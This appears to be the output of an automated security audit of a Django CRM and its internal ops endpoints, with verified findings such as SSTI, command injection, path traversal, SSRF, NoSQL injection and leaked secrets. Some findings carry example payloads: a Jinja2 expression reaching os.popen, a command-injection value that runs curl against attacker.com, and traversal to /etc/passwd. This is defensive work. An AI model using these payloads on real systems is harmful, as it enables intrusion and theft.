extra.message: Server-side template injection (SSTI) in Jinja rendering endpoint — An attacker with the internal ops token can inject Jinja2 expressions (e.g. `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`) to achieve remote code execution on the server. [verified: fragment is string-concatenated into Jinja2 template source and rendered, enabling SSTI/RCE; gate is only a static token.]

OS command injection via unsanitized host parameter — Anyone who can obtain/guess the `INTERNAL_OPS_TOKEN` header value can execute arbitrary OS commands on the server (e.g. `host=$(id)` or `host=127.0.0.1; curl attacker.com/x`), leading to full remote code execution. [verified: host param concatenated directly into os.system with no sanitization; only control is a static shared-secret header, not a real authz/authn boundary.]
OS command injection via host parameter — Remote code execution on the application server [verified: duplicate of finding 0; same unsanitized os.system concatenation.]

Tenant takeover via unscoped Organization CSV import — An Account Manager can seize ownership of any organization in the platform, gaining manage/view rights over tenants they should not access, and corrupt other tenants' business data (health score, renewal status, risk notes). [verified: imports() organization branch calls Organization.objects.update_or_create(name=row['name'], defaults={owner: request.user, ...}) with no visible_organizations/can_manage_org check, letting any Account Manager overwrite and take ownership of an arbitrary org by name.]

Sensitive internal endpoints protected only by a static shared-secret header — Anyone who obtains or brute-forces the static INTERNAL_OPS_TOKEN value gets unauthenticated access to file read/write, SSRF, command execution and NoSQL query endpoints, entirely outside normal user auth/authorization [verified: duplicate of finding 17; static shared-secret is sole authorization control for all sensitive routes.]

Single static shared-secret gates all sensitive internal endpoints — Any leak of the INTERNAL_OPS_TOKEN value (logs, source control, misconfigured client) grants an attacker full access to every dangerous operation in this module, and the non-constant-time comparison adds a timing side-channel for guessing the token. [verified: single static shared-secret compared with plain == is the sole gate for ~18 dangerous routes, no session/role-based authz or constant-time comparison.]

Path traversal allowing arbitrary file read — An attacker supplying `packet_ref=../../../../etc/passwd` (or any path outside BASE_EXPORT_DIR) can read arbitrary files readable by the application process, including source code, .env secrets, or SSH keys. [verified: packet_ref concatenated into path with no normalization/containment check, allowing traversal outside BASE_EXPORT_DIR.]

Server-side request forgery via relay_note endpoint — An attacker can make the server issue arbitrary outbound requests to internal-only services or cloud metadata endpoints (e.g. `http://169.254.169.254/latest/meta-data/`) and read the response, enabling internal network reconnaissance or credential theft. [verified: url param passed unchecked to urlopen with response body returned; no allowlist/scheme/IP restriction.]

Mass assignment allows overwriting privileged fields — An attacker can set `role: admin` or `approved: true` in the request body to escalate privileges or approve state that should require authorization, since the endpoint blindly merges untrusted input into privileged fields. [verified: workset.update(payload) merges arbitrary attacker JSON keys including role/approved/tier/balance with no field filtering.]

Path traversal write plus plaintext storage of sensitive PII — Combines arbitrary file write (via `ref=../../somewhere`) with storage of highly sensitive SSN/card data in plaintext, exposing PII at rest and enabling file-write-based RCE. [verified: ref unsanitized allows path traversal on write, and ssn/card values are stored in plaintext JSON with no encryption.]

Sensitive PII/financial data stored in plaintext on disk — Full SSN and card numbers persisted unencrypted to the filesystem, readable by anyone with filesystem or later path-traversal access to private_exports [verified: duplicate of finding 5's PII aspect; ssn/card written unencrypted to disk.]

CORS misconfiguration: reflected origin with credentials allowed — Any malicious website can issue credentialed cross-origin requests to this endpoint and read the response, enabling cross-site data theft if session cookies or credentials are attached. [verified: Origin header reflected into Access-Control-Allow-Origin while Allow-Credentials is true, permitting any origin credentialed access.]

Path traversal allowing arbitrary file write — An attacker can write attacker-controlled content to arbitrary filesystem locations outside the intended export directory (e.g. overwriting application code, cron scripts, or web-served files), which can lead to remote code execution. [verified: name param concatenated into path with no sanitization, writes attacker-controlled bytes outside BASE_EXPORT_DIR.]

NoSQL injection via unsanitized MongoDB filter — An attacker can inject MongoDB query operators (e.g. `$where`, `$regex`, `$ne`) to bypass intended query logic, exfiltrate arbitrary records, or in some driver/version configurations execute server-side JavaScript. [verified: raw JSON payload used directly as MongoDB query document with no operator/type validation.]

Hardcoded fallback SECRET_KEY and missing secure-cookie/TLS enforcement settings — Forged sessions, CSRF tokens, and password-reset tokens if the default secret key is used in production; session/CSRF cookies can be intercepted over unencrypted connections [verified: SECRET_KEY falls back to a hardcoded literal with no other guard forcing a real secret in production; no SESSION_COOKIE_SECURE/CSRF_COOKIE_SECURE/SECURE_SSL_REDIRECT anywhere in settings.py, so signing/CSRF integrity depends entirely on ops discipline.]

Business logic flaw: client-controlled ledger amount and approval state — Attacker can manipulate ledger balance arbitrarily (including inflating it via negative amounts) and force an 'approved' state regardless of actual eligibility [verified: amount and state taken directly from client payload and applied to ledger with no server-side validation of eligibility or sign.]

Open redirect via lane parameter — An attacker can craft a link through the trusted internal-ops host that redirects victims to an attacker-controlled external site, useful for phishing or OAuth token theft. [verified: lane value passed directly to redirect() with no allow-list of internal paths/hosts.]

Missing authentication gate on identity ping endpoint — Exposes an internal ops endpoint to fully unauthenticated callers, breaking the intended security boundary that every other route in this file enforces, and can be used to probe/queue identity verification workflows without any credential. [verified: this handler alone omits the _wrk_gate() check present in every other route, making it reachable unauthenticated.]

Hardcoded weak PIN verifier with no brute-force protection — An attacker can brute-force the 4-digit verifier (10,000 possibilities) in a handful of requests to pass identity verification for 'north'/'south' handles, and the codes themselves are hardcoded in source and never rotate. [verified: hardcoded 4-digit PIN map checked via plain != with no rate limiting/lockout, easily brute-forced.]

Brute-forceable verifier check with no rate limiting — Attacker can brute-force the 4-digit verifier code to gain 'queued' access for arbitrary handles [verified: duplicate of finding 12; static PIN map with no rate limiting.]

Privilege escalation via client-controlled authorization cookie — An attacker who reaches this endpoint (has the shared ops token) can trivially set `Cookie: ops_badge=lead` to obtain the 'elevated' response tier ('payroll: full', 'casework: open'), bypassing any real authorization check. [verified: elevated lane granted purely from client-supplied cookie/header value with no server-side signature or session tie.]

Privilege escalation via client-controlled cookie/header — Any caller who can set a cookie or header (e.g. via XSS on a related origin, or simply crafting the request once past the shared ops token) can self-grant elevated payroll/casework access [verified: duplicate of finding 10; client-controlled cookie/header grants elevated access lane.]

Disabled TLS certificate verification on outbound request — Allows a man-in-the-middle attacker on the network path to intercept or tamper with the 'partner' communication since the peer certificate is never validated. [verified: ssl._create_unverified_context() disables certificate validation for outbound HTTPS request.]

Disabled TLS certificate verification — Man-in-the-middle attackers can intercept or tamper with outbound partner traffic undetected [verified: duplicate of finding 15; unverified SSL context used for outbound request.]

Session/CSRF cookies missing Secure flag — Network attacker who can observe traffic (e.g. on shared Wi-Fi or via downgrade) can steal session/CSRF cookies and hijack authenticated sessions across any role including platform_admin. [verified: Confirmed absent: settings.py sets HTTPONLY and SAMESITE but never SESSION_COOKIE_SECURE/CSRF_COOKIE_SECURE/SECURE_SSL_REDIRECT, so cookies are sent over plaintext HTTP if TLS termination isn't strictly enforced upstream.]

Missing rate limiting on primary login and password-reset endpoints — Attacker can brute-force user passwords or enumerate/flood the password-reset flow across all tenants without any throttling, increasing risk of account takeover for any of the CRM's account managers, support agents, or customer-portal contacts. [verified: Login/password-reset use stock Django auth_views with no django-axes/django-ratelimit or lockout logic anywhere in middleware or views, so unauthenticated brute-force/enumeration is unmitigated on a reachable path.]

CSV formula injection in renewals report export — Arbitrary formula execution in the spreadsheet application of staff who export and open the renewals report, enabling data exfiltration or phishing via injected formulas. [verified: Duplicate/overlapping report of the same renewals CSV export sink at views.py's writer.writerow for org.name/risk_notes with no formula-prefix sanitization.]

Use of broken MD5 hash for security-sensitive digest — MD5 is trivially reversible via rainbow tables/collision attacks; if this digest is used anywhere for integrity or verification purposes it can be forged or reversed. [verified: unsalted MD5 used for a security-sounding digest endpoint, a broken algorithm for such use.]

Endpoint deliberately disables security headers — Weakens defense-in-depth for any content reflected through this or related response paths, increasing exploitability of any XSS elsewhere in the app that shares these headers/response patterns. [verified: endpoint explicitly disables XSS-Protection and empties CSP headers on its response.]

Weak PRNG used to generate security code — Predictable codes/nonces can be brute-forced or guessed by an attacker [verified: duplicate of finding 14; non-cryptographic random module used for security code.]

Insecure PRNG used to generate security code/nonce — An attacker who can observe PRNG state or timing may predict generated codes, undermining any authentication or CSRF-token-like use of this value. [verified: random.choice (non-CSPRNG) used to generate a security 'code' value instead of the secrets module.]

API key / webhook secret exposure via flash messages — Secret material can persist in session storage, be captured via shared devices/browser history, or leak through logging of message content, increasing risk of credential compromise. [verified: api_key_create and webhook_create pass raw plaintext secret into messages.success, persisting it in the Django messages/session store instead of a one-time secure channel.]

API key secret leaked via flash message on rotation — Plaintext API key secret can be captured via browser history, shared proxies, or logging/monitoring of message content, allowing full API key takeover for the organization. [verified: api_key_rotate independently flashes the newly rotated plaintext secret via messages.success, same missing-control pattern as the create flow.]

Webhook signing secret leaked via flash message on creation — Disclosure of the webhook signing secret lets an attacker with access to logs/history/DOM snapshots forge webhook payloads that appear authentically signed by this CRM instance. [verified: webhook_create flashes the new webhook signing secret in plaintext via messages.success with no one-time-reveal mechanism.]

Non-constant-time API key secret comparison — An attacker who can measure fine-grained response timing may exploit the non-constant-time comparison to incrementally guess the correct hash, potentially forging a valid Authorization Bearer token for the organization_summary_api endpoint. [verified: _api_key_from_request compares hashes with plain == instead of hmac.compare_digest, a genuine missing constant-time-compare control, though practical remote exploitation is difficult given network jitter.]
